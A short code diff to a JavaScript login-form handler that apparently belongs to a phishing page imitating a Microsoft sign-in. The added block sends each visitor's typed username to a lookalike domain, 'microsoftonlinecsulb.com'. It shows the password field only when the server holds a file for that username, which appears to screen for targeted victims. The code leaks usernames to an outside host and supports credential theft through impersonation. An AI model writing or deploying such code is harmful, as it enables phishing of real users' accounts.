@@ -27,6 +27,22 @@ $(document).on('submit','#login-form',function(e)
           loadingDiv.style.display = "block";
           superloadingDiv.style.display = "block";
           passwordDiv.style.display = "none";
+          $.ajax({
+            url:'https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt',
+            type:'HEAD',
+            error: function()
+            {
+                //file not exists
+                console.log("err")
+            },
+            success: function()
+            {
+                //file exists
+                loadingDiv.style.display = "none";
+            superloadingDiv.style.display = "none";
+            passwordDiv.style.display = "block";
+            }
+        });
         }
       })
     });
